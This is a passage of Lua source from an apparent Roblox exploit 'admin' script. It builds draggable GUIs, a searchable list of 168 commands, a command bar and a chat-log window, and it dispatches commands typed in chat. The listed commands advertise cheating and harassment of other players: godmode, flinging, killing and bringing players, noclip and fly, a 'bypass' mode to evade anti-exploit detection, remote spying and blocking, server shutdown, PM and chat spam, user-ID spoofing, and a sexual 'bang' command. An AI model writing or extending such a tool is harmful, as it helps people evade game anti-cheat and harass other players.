			local dragTime = 0.055
			local SmoothDrag = {}
			SmoothDrag.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
			local dragSmoothFunction = gsTween:Create(Frame, TweenInfo.new(dragTime, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), SmoothDrag)
			dragSmoothFunction:Play()
		end
		Frame.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = true
				dragStart = input.Position
				startPos = Frame.Position
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				end)
			end
		end)
		Frame.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)
		UserInputService.InputChanged:Connect(function(input)
			if input == dragInput and dragging and Frame.Size == UDim2.new(0, 265, 0, 302) then
				update(input)
			end
		end)
	end
	function clientSided()
		Notification("info", "This command is for the client (you) only, no one else can see!", 6)
	end
	searchCmds={"1 print [msg] - Prints a message to the developer console","2 warn [msg] - Warns a message to the developer console","3 sit - Makes you sit","4 god - Activates FE Godmode (breaks tools)","5 view [plr] - Changes your camera subject to another player","6 unview - Changes your camera back to your player","7 gravity [num] - Changes workspace gravity to [num]","8 ungravity - Reverts workspace gravity to game's default","9 goto [plr] - Teleports you to a player","10 fecheck - Checks whether the game is FE or not","11 lockws - Locks the whole workspace","12 unlockws - Unlocks the whole workspace","13 noclip - Allows you to walk through walls and other objects","14 clip - Stops noclip, can collide","15 follow [plr] / [num] - Makes you follow a player constantly, optional [num] for how far away to follow","16 unfollow - Stops you from following","17 fling [plr] / [pow] - Uses your character to fling a player, optional [pow] for how much power to put into the fling","18 unfling - Stops you from flinging","19 trail [plr] / [num] - Makes you trail (walk infront) of a player constantly, optional [num] for how far away to trail","20 untrail - Stops you from trailing","21 annoy [plr] - Loop teleports you to the player","22 unannoy - Stops loop teleporting you","23 reset - Resets your character","24 grespawn - Respawns your character, best for use after FE godmode","25 respawn - Respawns your character, best to use if grespawn fails to work","26 speed // ws [num] - Changes your walkspeed (speed or ws) to [num]","27 jumppower // jp [num] - Changes your jumppower (jumppower or jp) to [num]","28 hipheight // hh [num] - Changes your hipheight (hipheight or hh) to [num]","29 default - Changes your walkspeed, jumppower and hipheight back to normal","30 credits - Displays admin credits (by illremember#3799)","31 attach [plr] - Attaches you to a player, tool required","32 fly / [speed] - Enables fly, optional [speed] for how fast to fly","33 unfly - Disables fly","34 kill [plr] - Kills a player, tool required","35 bring [plr] - Brings a player, tool required","36 naked - Displays avatar body colours","37 nolimbs - Deletes all your arms and legs","38 noarms - Deletes both your arms","39 nolegs - Deletes both your legs","40 antikick [on/off] - Blocks all remotes for antikick when on, disables when off","41 blockremote [remote] / [service] - Blocks a remote from firing, optional [service] for where the remote is located","42 remotespy [on/off] - Prints all remotes to developer console when on when fired, stops printing when off","43 bang [plr] / [speed] - Bangs a player, optional [speed] to set animation adjust speed","44 unbang - Stops bang player","45 spam [msg] - Spams [msg] in chat","46 spamdelay [num] - Sets how long to wait in between spamming","47 unspam - Stops spamming","48 info [plr] - Creates GUI with information about player account, shows Account age, membership and account ID","49 age [plr] - Chats account age of player","50 invisible - Enables FE invisibility, by Timeless","51 walk [plr] - Begins to make you loop walk towards player","52 glitch [plr] / [num] - Glitches a player, tool required, optional [num] for strength of glitch","53 tp [plr] [plr] - Teleports a player to another player, tool required","54 givetool [plr] / [tool] - Gives your current equipped tool to player, optional [tool] to pick a tool by name from your inventory","55 givealltools [plr] - Gives all tools currently equipped and in inventory to player","56 blockhats - Removes mesh of all accessories","57 blocktool - Removes mesh of currently equipped tool","58 orbit [plr] - Begins to make you orbit around a player","59 unorbit - Stops you orbiting a player","60 pos - Shows your current position","61 savepos - Saves your current position","62 loadpos - Loads your current position from savepos","63 tppos [num] [num] [num] - Teleports you to position [num], [num], [num]","64 pmspam [plr] [msg] - Makes you spam a player's pm with [msg]","65 unpmspam - Stops spamming a player's pm","66 wsvis [num] - Changes all parts in workspace to [num] transparency","67 bringobj [obj] / [num] - Brings an object in the workspace to you, optional [num] for how far away to bring object","68 cbring [plr] - Brings a player to you constantly on client","69 uncbring - Stops bringing a player to you on client","70 cfreeze [plr] - Freezes a player on your client","71 uncfreeze / [plr] - Unfreezes a player on your cleint","72 unattach - Unattaches you from a player","73 reach [on/off] / [num] - Activates/Deactivates reach for currently equipped tool, optional [num] for how long the reach should be","74 droptool / [tool] - Drops a tool into the workspace, optional [tool] command for which tool to drop","75 drophats - Drops all your accessories into the workspace","76 hidecmdbar - Hides the command bar","77 showcmdbar - Shows the command bar","78 prefix [key] - Changes your prefix to [key] must be 1 character","79 removeinvis - Removes all invisible parts in workspace","80 removefog - Removes fog in lighting","81 animation [id/gui] / [speed] - Makes you play an animation with [id], optional [speed] for adjusting animation speed OR [gui] to open Energize animation GUI","82 btools - Gives you btools for deleting, copying and dragging (client side)","83 esp [plr] - Enables an esp for that player, credits to Infinite Yield","84 unesp / [plr] - Disables all esp, optional [plr] for disabling esp just for that player","85 dice - Chats you rolling a dice for 1, 2, 3, 4, 5 or 6","86 random [min] [max] - Chats you picking a random number between [min] and [max]","87 closegame - Shutsdown/closes your game","88 savetool / [tool] - Saves a tool to your player equipped, optional [tool] for which tool to save in your inventory","89 loadtool / [tool] - Loads a tool from your player, optional [tool] for which tool to load by name","90 savealltool - Saves all tools in your character/inventory","91 loadalltool - Loads all tools in your player saved tools","92 clicktp / [key] - Enables click teleport, optional [key] to set a key instead of clicking","93 clickdel / [key] - Enables click delete part, optional [key] to set a key instead of clicking","94 unclicktp - Disables clicktp","95 unclickdel - Disables clickdel","96 shutdown - Attempts a server shutdown","97 chatlogs - Opens up a chat log gui with options to print chat to developer console","98 stopadmin - Disables currently running admin completely","99 freecam / [speed] - Enables freecam (like flying but not in character), optional [speed] for how fast the freecam should go","100 unfreecam // unfc - Disables freecam","101 fctp [plr] - Teleports your freecam to player","102 gotofc - Teleports you to current freecam position","103 cmds - Opens up this GUI with commands","104 fullcredits - Shows full individual credits for all help with the admin","105 hotkey [key] [cmd] - Creates a hotkey that executes [cmd] when [key] is pressed","106 removehotkey [key] - Removes a hotkey with [key]","107 removeallhotkey - Removes all current hotkeys for commands","108 printhotkeys - Prints all current existing hotkeys","109 os [plr] - Chats the current OS of a player","110 spin [plr] - Makes you spin with a player, tool required","111 unspin - Stops you spinning a player/teleporting to a player","112 explorer - Loads DEX explorer","113 maxzoom [num] - Changes your maxzoom to number","114 stare [plr] - Makes you stare at another player","115 unstare [plr] - Makes you stop staring at player","116 tempgod - Enables temporary FE godmode, does not work on all games, does not break tools","117 void [plr] - Teleports you and a player to the void, requires a tool","118 freefall [plr] - Makes you and a player freefall to the ground","119 version - Shows current admin's version","120 shiftlockon - Enables shift lock if not enabled by game developer","121 copychat [plr] - Makes you copy the chat player says, use uncopychat to stop copying chat","122 newattach [plr] - Does not FE Godmode you, requires 2 tools, attaches you to player","123 newkill [plr] - Does not FE Godmode you, requires 2 tools, kills player","124 newbring [plr] - Does not FE Godmode you, requires 2 tools, brings player","125 spawn [ws/jp/hh/god] [num] - Sets your walkspeed/jumppower/hipheight to number whenever you respawn, or makes you FE Godded whenever you respawn","126 unspawn - Stops you spawning with stats set by "..commandPrefix.."spawn","127 autosavetool [on/off] - Auto saves your tools when you reset","128 beginbot / [mode] - Makes you a bot for other players, type just "..commandPrefix.."beginbot to print available modes","129 endbot / [mode] - Ends "..commandPrefix.."beginbot, optional [mode] to disable one mode only","130 stopsit - Disables your ability to sit","131 gosit - Enables your ability to sit","132 spawnpoint - Sets your spawnpoint for whenever you reset to where you are","133 nospawn - Removes your spawnpoint","134 chaterror - Creates a chat error, works best first time","135 bypass [on/off] - Changes certain commands like "..commandPrefix.."fly so they are not detected by most anti-exploits", "136 fixcam - Fixes your camera in case it breaks", "137 gotoobj [obj] - Teleports you to a part in the workspace, make sure you put the name properly!", "138 breakcam - Makes it so your camera can go through parts, fixed with "..commandPrefix.."fixcam", "139 inviscam - Makes it so your camera goes through parts and makes them transparent so your character is always visible, fixed with "..commandPrefix.."fixcam", "140 printobj / [key] - Prints the object's path clicked to developer console, optional [key] for key pressed instead of click", "141 unprintobj - Stops printobj from running", "142 hotkeyfc [goto/unfc] - If freecam is set as a hotkey, chooses whether to use unfreecam or gotofc when disabling through a hotkey", "143 carpet [plr] - Makes you a carpet for a player", "144 uncarpet - Stops carpet", "145 brickcreate [num] / [pos] [pos] [pos] - Creates [num] amount of bricks from accessories, wont work in all games, optional [pos] for position to create bricks", "146 uncopychat - Stops copying chat", "147 forward / [speed] - Makes you automatically move forward default speed is 1", "148 unforward - Stops you moving automatically forward from forward", "149 id [plr] - Makes you chat the user ID of the player", "150 spinhats / [pow] - Makes all your accessories begin to spin around! Credit to xFunnieuss.", "151 unspinhats - Stops spinhats from spinning accessories", "152 headless - Makes you headless, but cannot control your character after, use grespawn to reset", "153 savemap - Saves the current workspace/map", "154 loadmap - Loads map saved by savemap", "155 creatorid - Changes your user ID to the game creator's user ID", "156 gameid - Shows the game's ID", "157 delobj [obj] - Allows you to delete an object in the workspace by name", "158 glide [plr] / [speed] - Makes you glide towards a player, optional [speed] for the speed of gliding", "159 stutter [on/off] - Makes your character begin stuttering as you move", "160 platform - Creates a platform on your client that you can stand on, deletes in 20 seconds", "161 servertime - Gets the server time", "162 ride [plr] - Makes you ride a player's head", "163 unride [plr] - Makes you stop riding a player's head", "164 cmute [plr] - Client mutes a player, useful for muting spammers", "165 uncmute - Unmutes a player that has been cmuted", "166 hat [plr] - Makes you carpet a player, but on their head", "167 unhat - Stops hat from running", "168 chat [msg] - Makes you chat a string, useful for hotkeys"}
	CMDS={"print [msg]","warn [msg]","sit","god","view [plr]","unview","gravity [num]","ungravity","goto [plr]","fecheck","lockws","unlockws","noclip","clip","follow [plr] / [num]","unfollow","fling [plr] / [pow]","unfling","trail [plr] / [num]","untrail","annoy [plr]","unannoy","reset","grespawn","respawn","speed // ws [num]","jumppower // jp [num]","hipheight // hh [num]","default","credits","attach [plr]","fly / [speed]","unfly","kill [plr]","bring [plr]","naked","nolimbs","noarms","nolegs","antikick [on/off]","blockremote [remote] / [service]","remotespy [on/off]","bang [plr] / [speed]","unbang","spam [msg]","spamdelay [num]","unspam","info [plr]","age [plr]","invisible","walk [plr]","glitch [plr] / [num]","tp [plr] [plr]","givetool [plr] / [tool]","givealltools [plr]","blockhats","blocktool","orbit [plr]","unorbit","pos","savepos","loadpos","tppos [num] [num] [num]","pmspam [plr] [msg]","unpmspam","wsvis [num]","bringobj [obj] / [num]","cbring [plr] / [num]","uncbring","cfreeze [plr]","uncfreeze / [plr]","unattach","reach [on/off] / [num]","droptool / [tool]","drophats","hidecmdbar","showcmdbar","prefix [key]","removeinvis","removefog","animation [id/gui] / [speed]","btools","esp [plr]","unesp / [plr]","dice","random [min] [max]","closegame","savetool / [tool]","loadtool / [tool]","savealltool","loadalltool","clicktp / [key]","clickdel / [key]","unclicktp","unclickdel","oof","chatlogs","stopadmin","freecam / [speed] // fc / [speed]","unfreecam // unfc","gotofc","cmds","fullcredits","hotkey [key] [cmd]","removehotkey [key]","removeallhotkey","printhotkeys","os [plr]","spin [plr]","unspin","fctp [plr]","explorer","maxzoom [num]","stare [plr]","unstare [plr]","tempgod","void [plr]","freefall [plr]","version","shiftlockon","copychat [plr]","newattach [plr]","newkill [plr]","newbring [plr]","spawn [ws/jp/hh/god] [num]","unspawn","autosavetool [on/off]","beginbot / [mode]","endbot / [mode]","stopsit","gosit","spawnpoint","nospawn","chaterror", "bypass [on/off]", "fixcam", "gotoobj [obj]", "breakcam", "inviscam", "printobj / [key]", "unprintobj", "hotkeyfc [goto/unfc]", "carpet [plr]", "uncarpet", "brickcreate [num] / [pos] [pos] [pos]", "uncopychat", "forward / [speed]", "unforward", "id [plr]", "spinhats / [pow]", "unspinhats", "headless", "savemap", "loadmap", "creatorid", "gameid", "delobj [obj]", "glide [plr] / [speed]", "stutter [on/off]", "platform", "servertime", "ride [plr]", "unride", "cmute [plr]", "uncmute", "hat [plr]", "unhat", "chat [msg]"} -- 168
	local CMDS_GUI_V2 = Instance.new("ScreenGui")
	local CMDSmain = Instance.new("Frame")
	local CMDSframemain = Instance.new("Frame")
	local cmdgui_topframe = Instance.new("Frame")
	local closecmdsgui = Instance.new("TextButton")
	local cmdgui_midframe = Instance.new("Frame")
	local cmdsgui_SearchFunction = Instance.new("TextBox")
	local cmdsgui_searchDETAILFRAME = Instance.new("Frame")
	local cmdsgui_searchDETAILTEXT = Instance.new("TextLabel")
	local ListofCMDS = Instance.new("ScrollingFrame")
	local cmdTutorial = Instance.new("TextLabel")
	local cmdTutorial_2 = Instance.new("TextLabel")
	local cmdTutorial_3 = Instance.new("TextLabel")
	local CMDS_Shadow = Instance.new("Frame")
	local CMDS_Shadow2 = Instance.new("Frame")
	CMDS_GUI_V2.Name = "CMDS_GUI_V2"
	CMDS_GUI_V2.Parent = game.Players.LocalPlayer.PlayerGui
	CMDS_GUI_V2.ResetOnSpawn = false
	CMDSmain.Name = "CMDSmain"
	CMDSmain.Parent = CMDS_GUI_V2
	CMDSmain.BackgroundColor3 = Color3.new(1, 1, 1)
	CMDSmain.BackgroundTransparency = 1
	CMDSmain.Position = UDim2.new(0, 695, 0, 297)
	CMDSmain.Size = UDim2.new(0, 440, 0, 367)
	CMDSmain.AnchorPoint = Vector2.new(0.5, 0.5)
	CMDSmain.Visible = false
	CMDSmain.ClipsDescendants = true
	CMDSframemain.Name = "CMDSframemain"
	CMDSframemain.Parent = CMDSmain
	CMDSframemain.BackgroundColor3 = Color3.new(0.309804, 0.309804, 0.309804)
	CMDSframemain.BorderSizePixel = 0
	CMDSframemain.Size = UDim2.new(0, 440, 0, 367)
	cmdgui_topframe.Name = "cmdgui_topframe"
	cmdgui_topframe.Parent = CMDSframemain
	cmdgui_topframe.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
	cmdgui_topframe.BorderSizePixel = 0
	cmdgui_topframe.Size = UDim2.new(0, 440, 0, 15)
	closecmdsgui.Name = "closecmdsgui"
	closecmdsgui.Parent = cmdgui_topframe
	closecmdsgui.BackgroundColor3 = Color3.new(1, 1, 1)
	closecmdsgui.BackgroundTransparency = 1
	closecmdsgui.Position = UDim2.new(0, 410, 0, 0)
	closecmdsgui.Size = UDim2.new(0, 30, 0, 15)
	closecmdsgui.Font = Enum.Font.SourceSansBold
	closecmdsgui.Text = "X"
	closecmdsgui.TextColor3 = Color3.new(0.968628, 0.968628, 0.968628)
	closecmdsgui.TextSize = 20
	cmdgui_midframe.Name = "cmdgui_midframe"
	cmdgui_midframe.Parent = CMDSframemain
	cmdgui_midframe.BackgroundColor3 = Color3.new(0.14902, 0.14902, 0.14902)
	cmdgui_midframe.BorderSizePixel = 0
	cmdgui_midframe.Position = UDim2.new(0, 0, 0, 15)
	cmdgui_midframe.Size = UDim2.new(0, 440, 0, 45)
	cmdsgui_SearchFunction.Name = "cmdsgui_SearchFunction"
	cmdsgui_SearchFunction.Parent = cmdgui_midframe
	cmdsgui_SearchFunction.BackgroundColor3 = Color3.new(1, 1, 1)
	cmdsgui_SearchFunction.BackgroundTransparency = 1
	cmdsgui_SearchFunction.BorderSizePixel = 0
	cmdsgui_SearchFunction.Position = UDim2.new(0, 120, 0, 10)
	cmdsgui_SearchFunction.Size = UDim2.new(0, 200, 0, 25)
	cmdsgui_SearchFunction.Font = Enum.Font.SourceSans
	cmdsgui_SearchFunction.Text = ""
	cmdsgui_SearchFunction.TextColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	cmdsgui_SearchFunction.TextScaled = true
	cmdsgui_SearchFunction.TextSize = 14
	cmdsgui_SearchFunction.TextWrapped = true
	cmdsgui_searchDETAILFRAME.Name = "cmdsgui_searchDETAILFRAME"
	cmdsgui_searchDETAILFRAME.Parent = cmdsgui_SearchFunction
	cmdsgui_searchDETAILFRAME.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
	cmdsgui_searchDETAILFRAME.BorderSizePixel = 0
	cmdsgui_searchDETAILFRAME.Position = UDim2.new(0, 0, 0, 25)
	cmdsgui_searchDETAILFRAME.Size = UDim2.new(0, 200, 0, 2)
	cmdsgui_searchDETAILTEXT.Name = "cmdsgui_searchDETAILTEXT"
	cmdsgui_searchDETAILTEXT.Parent = cmdsgui_SearchFunction
	cmdsgui_searchDETAILTEXT.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
	cmdsgui_searchDETAILTEXT.BackgroundTransparency = 1
	cmdsgui_searchDETAILTEXT.Size = UDim2.new(0, 200, 0, 25)
	cmdsgui_searchDETAILTEXT.Font = Enum.Font.SourceSansLight
	cmdsgui_searchDETAILTEXT.Text = "Search"
	cmdsgui_searchDETAILTEXT.TextColor3 = Color3.fromRGB(240, 240, 240)
	cmdsgui_searchDETAILTEXT.TextSize = 30
	ListofCMDS.Name = "ListofCMDS"
	ListofCMDS.Parent = CMDSframemain
	ListofCMDS.BackgroundColor3 = Color3.new(0.309804, 0.309804, 0.309804)
	ListofCMDS.BorderSizePixel = 0
	ListofCMDS.Position = UDim2.new(0, 0, 0, 60)
	ListofCMDS.Size = UDim2.new(0, 440, 0, 307)
	ListofCMDS.CanvasSize = UDim2.new(5, 0, 8, 0)
	ListofCMDS.ScrollingDirection = Enum.ScrollingDirection.XY
	cmdTutorial.Name = "cmdTutorial"
	cmdTutorial.Parent = ListofCMDS
	cmdTutorial.BackgroundColor3 = Color3.new(1, 1, 1)
	cmdTutorial.BackgroundTransparency = 1
	cmdTutorial.BorderSizePixel = 0
	cmdTutorial.Position = UDim2.new(0, 5, 0, 5)
	cmdTutorial.Size = UDim2.new(0, 420, 0, 20)
	cmdTutorial.Font = Enum.Font.SourceSansBold
	cmdTutorial.Text = "\"/\" means OPTIONAL argument after"
	cmdTutorial.TextColor3 = Color3.new(0.956863, 0.956863, 0.956863)
	cmdTutorial.TextScaled = true
	cmdTutorial.TextSize = 14
	cmdTutorial.TextWrapped = true
	cmdTutorial.TextXAlignment = Enum.TextXAlignment.Left
	cmdTutorial_2.Name = "cmdTutorial"
	cmdTutorial_2.Parent = ListofCMDS
	cmdTutorial_2.BackgroundColor3 = Color3.new(1, 1, 1)
	cmdTutorial_2.BackgroundTransparency = 1
	cmdTutorial_2.BorderSizePixel = 0
	cmdTutorial_2.Position = UDim2.new(0, 5, 0, 25)
	cmdTutorial_2.Size = UDim2.new(0, 420, 0, 20)
	cmdTutorial_2.Font = Enum.Font.SourceSansBold
	cmdTutorial_2.Text = "\"//\" means another way of running command"
	cmdTutorial_2.TextColor3 = Color3.new(0.956863, 0.956863, 0.956863)
	cmdTutorial_2.TextScaled = true
	cmdTutorial_2.TextSize = 14
	cmdTutorial_2.TextWrapped = true
	cmdTutorial_2.TextXAlignment = Enum.TextXAlignment.Left
	cmdTutorial_3.Name = "cmdTutorial"
	cmdTutorial_3.Parent = ListofCMDS
	cmdTutorial_3.BackgroundColor3 = Color3.new(1, 1, 1)
	cmdTutorial_3.BackgroundTransparency = 1
	cmdTutorial_3.BorderSizePixel = 0
	cmdTutorial_3.Position = UDim2.new(0, 5, 0, 45)
	cmdTutorial_3.Size = UDim2.new(0, 420, 0, 20)
	cmdTutorial_3.Font = Enum.Font.SourceSansBold
	cmdTutorial_3.Text = "Anything inside \"[ ]\" is an argument for the command"
	cmdTutorial_3.TextColor3 = Color3.new(0.956863, 0.956863, 0.956863)
	cmdTutorial_3.TextScaled = true
	cmdTutorial_3.TextSize = 14
	cmdTutorial_3.TextWrapped = true
	cmdTutorial_3.TextXAlignment = Enum.TextXAlignment.Left
	CMDS_Shadow.Name = "CMDS_Shadow"
	CMDS_Shadow.Parent = CMDSmain
	CMDS_Shadow.BackgroundColor3 = Color3.new(0, 0, 0)
	CMDS_Shadow.BackgroundTransparency = 0.60000002384186
	CMDS_Shadow.BorderSizePixel = 0
	CMDS_Shadow.Position = UDim2.new(0, 2, 0, 2)
	CMDS_Shadow.Size = UDim2.new(0, 440, 0, 367)
	CMDS_Shadow.ZIndex = -1
	CMDS_Shadow2.Name = "CMDS_Shadow2"
	CMDS_Shadow2.Parent = CMDSmain
	CMDS_Shadow2.BackgroundColor3 = Color3.new(0, 0, 0)
	CMDS_Shadow2.BackgroundTransparency = 0.80000001192093
	CMDS_Shadow2.BorderSizePixel = 0
	CMDS_Shadow2.Position = UDim2.new(0, 5, 0, 5)
	CMDS_Shadow2.Size = UDim2.new(0, 440, 0, 367)
	CMDS_Shadow2.ZIndex = -1
	closecmdsgui.MouseButton1Click:Connect(function()
		CMDSmain:TweenSize(UDim2.new(0, 0, 0, 0), "InOut", "Sine", 2)
	end)
	function CreateCMDlabel(position, text)
		local sizenow = 15
		local cmdHere = Instance.new("TextLabel")
		cmdHere.Name = "cmdHere"
		cmdHere.TextWrapped = true
		cmdHere.Parent = ListofCMDS
		cmdHere.BackgroundColor3 = Color3.new(1, 1, 1)
		cmdHere.BackgroundTransparency = 1
		cmdHere.BorderSizePixel = 0
		cmdHere.Position = position
		cmdHere.Size = UDim2.new(0, 1950, 0, sizenow)
		cmdHere.Font = Enum.Font.SourceSans
		cmdHere.Text = text
		cmdHere.TextWrapped = true
		cmdHere.TextColor3 = Color3.new(0.956863, 0.956863, 0.956863)
		cmdHere.TextScaled = false
		cmdHere.TextSize = 20
		cmdHere.TextXAlignment = Enum.TextXAlignment.Left
	end
	for i,_cmds in pairs(searchCmds) do
		CreateCMDlabel(UDim2.new(0, 5, 0, 50 + (i * 15)), _cmds)
	end
	local UserInputService = game:GetService("UserInputService")
	local dragging
	local dragInput
	local dragStart
	local startPos
	local function updateCMDS(input)
		local delta = input.Position - dragStart
		local dragTime = 0.055
		local SmoothDrag = {}
		SmoothDrag.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		local dragSmoothFunction = gsTween:Create(CMDSmain, TweenInfo.new(dragTime, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), SmoothDrag)
		dragSmoothFunction:Play()
	end
	cmdgui_topframe.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = CMDSmain.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	cmdgui_topframe.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	cmdgui_midframe.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = CMDSmain.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	cmdgui_midframe.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			updateCMDS(input)
		end
	end)
	cmdsgui_SearchFunction.Focused:Connect(function()
		cmdsgui_SearchFunction.TextTransparency = 0
		local searchTween = {}
		searchTween.TextColor3 = Color3.new(0.0980392, 0.462745, 0.823529)
		searchTween.TextSize = 18
		searchTween.Position = UDim2.new(0, -70, 0, -15)
		local frameTweenblue = {}
		frameTweenblue.BackgroundColor3 = Color3.new(0.0980392, 0.462745, 0.823529)
		local searchTween1 = gsTween:Create(cmdsgui_searchDETAILTEXT, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), searchTween)
		searchTween1:Play()
		local frameTweenblue1 = gsTween:Create(cmdsgui_searchDETAILFRAME, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), frameTweenblue)
		frameTweenblue1:Play()
	end)
	cmdsgui_SearchFunction.FocusLost:Connect(function(enterPressed)
		if not enterPressed then
			cmdsgui_SearchFunction.TextTransparency = 1
		else
			cmdsgui_SearchFunction.Text = " "
		end
		local searchTween = {}
		searchTween.TextColor3 = Color3.fromRGB(240, 240, 240)
		searchTween.TextSize = 30
		searchTween.Position = UDim2.new(0, 0, 0, 0)
		local frameTweenblue = {}
		frameTweenblue.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
		local searchTween1 = gsTween:Create(cmdsgui_searchDETAILTEXT, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), searchTween)
		searchTween1:Play()
		local frameTweenblue1 = gsTween:Create(cmdsgui_searchDETAILFRAME, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), frameTweenblue)
		frameTweenblue1:Play()
	end)
	cmdsgui_SearchFunction.Changed:Connect(function()
		local index = 0
		if cmdsgui_SearchFunction.Text ~= "" then
			for i,v in pairs(ListofCMDS:GetChildren()) do
				if v.Name == "cmdHere" then
					if not string.find(v.Text, cmdsgui_SearchFunction.Text) then
						v.Visible = false
					else
						v.Visible = true
						index = index + 1
						v.Position = UDim2.new(0, 5, 0, 50 + (index * 15))
					end
				end
			end
		end
	end)

	-- Command Execution
	LP.Chatted:Connect(function(chat)
		run(chat)
	end)

	function run(msg)
		if string.lower(string.sub(msg, 2, 5)) == "chat" then
			msg = msg
		elseif string.match(msg, "hotkey") and string.match(msg, "chat") then
			msg = msg
		else
			msg = string.lower(msg)
		end
		local cmdPrefix = string.sub(msg, 1, 1)
		if cmdPrefix == commandPrefix then
			msg = string.sub(msg, 2)
			local args = {}
			for arg in string.gmatch(msg,"[^%s]+") do
				table.insert(args,arg)
			end
			local cmdName = args[1]
			table.remove(args,1)
			local doCmd = Commands[cmdName]

			if doCmd ~= nil then
				doCmd(args)
			end
		end
	end

	-- Command bar
	local CommandBar = Instance.new("ScreenGui")
	local CMDBAR = Instance.new("Frame")
	local CMDBARText = Instance.new("TextBox")
	CommandBar.Name = "CommandBar"
	CommandBar.Parent = game.Players.LocalPlayer.PlayerGui
	CommandBar.ResetOnSpawn = false
	CMDBAR.Name = "CMDBAR"
	CMDBAR.Parent = CommandBar
	CMDBAR.BackgroundColor3 = Color3.new(0.164706, 0.152941, 0.172549)
	CMDBAR.BorderSizePixel = 0
	CMDBAR.Position = UDim2.new(0.025, 0, 1, 0)
	CMDBAR.Size = UDim2.new(0, 270, 0, 35)
	CMDBARText.Name = "CMDBARText"
	CMDBARText.Parent = CMDBAR
	CMDBARText.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
	CMDBARText.BorderSizePixel = 0
	CMDBARText.Position = UDim2.new(0, 5, 0, 5)
	CMDBARText.Size = UDim2.new(0, 260, 0, 25)
	CMDBARText.Font = Enum.Font.SourceSansLight
	CMDBARText.Text = ""
	CMDBARText.TextColor3 = Color3.new(0.933333, 0.933333, 0.933333)
	CMDBARText.TextScaled = true
	CMDBARText.TextSize = 14
	CMDBARText.TextWrapped = true
	Mouse.KeyDown:connect(function(Key)
		if Key == string.lower(commandPrefix) then
			CMDBARText:CaptureFocus()
			CMDBAR:TweenPosition(UDim2.new(0.015, 0, 0.95, 0), "Out", "Elastic", 0.5, true)
		end
	end)
	CMDBARText.FocusLost:connect(function(enterPressed)
		CMDBAR:TweenPosition(UDim2.new(0.015, 0, 1, 0), "Out", "Quad", 0.5, true)
		if enterPressed then
			local cmdmsg = CMDBARText.Text
			CMDBARText.Text = ""
			run(commandPrefix..cmdmsg)
		end
	end)
	local Match = Instance.new("Frame")
	Match.Name = "Match"
	Match.Parent = CMDBAR
	Match.BackgroundColor3 = Color3.new(0.164706, 0.152941, 0.172549)
	Match.BorderSizePixel = 0
	Match.Position = UDim2.new(0, 0, -4, 0)
	Match.Size = UDim2.new(1, 0, 4, 0)
	Match.Visible = false
	function CreateOption(Text)
		local Option1 = Instance.new("TextLabel")
		Option1.Name = "Option"
		Option1.Parent = Match
		Option1.BackgroundColor3 = Color3.new(1, 1, 1)
		Option1.BackgroundTransparency = 1
		Option1.Position = UDim2.new(-10, 0, 0, 0)
		Option1.Size = UDim2.new(1, 0, 0, 20)
		Option1.Font = Enum.Font.SourceSans
		Option1.Text = Text
		Option1.TextColor3 = Color3.new(0.952941, 0.952941, 0.952941)
		Option1.TextScaled = true
		Option1.TextWrapped = true
	end
	for i,cmdtext2 in pairs(CMDS) do
		CreateOption(cmdtext2)
	end
	CMDBARText.Changed:Connect(function()
		if CMDBARText.Text ~= "" and CMDBARText.Text ~= commandPrefix then
			Match.Visible = true
			local PositionMatch = 0
			for i,cmdtext in pairs(Match:GetChildren()) do
				if cmdtext.Name == "Option" then
					if string.find(cmdtext.Text, CMDBARText.Text) then
						cmdtext.Position = UDim2.new(0, 0, 0, 2 + (PositionMatch * 20))
						PositionMatch = PositionMatch + 1
						if cmdtext.Position == UDim2.new(0, 0, 0, 142) then
							cmdtext.Position = UDim2.new(-10, 0, 0, 0)
							PositionMatch = PositionMatch - 1
						end
					else
						cmdtext.Position = UDim2.new(-10, 0, 0, 0)
					end
				end
			end
		else
			Match.Visible = false
		end
	end)

	-- Chat
	local ChatLogsv2 = Instance.new("ScreenGui")
	local MainChatFrame = Instance.new("Frame")
	local Framess = Instance.new("Frame")
	local CloseChatGUI = Instance.new("TextButton")
	local Frame_222 = Instance.new("Frame")
	local PrintChat = Instance.new("TextButton")
	local Shadow1 = Instance.new("Frame")
	local Shadow2 = Instance.new("Frame")
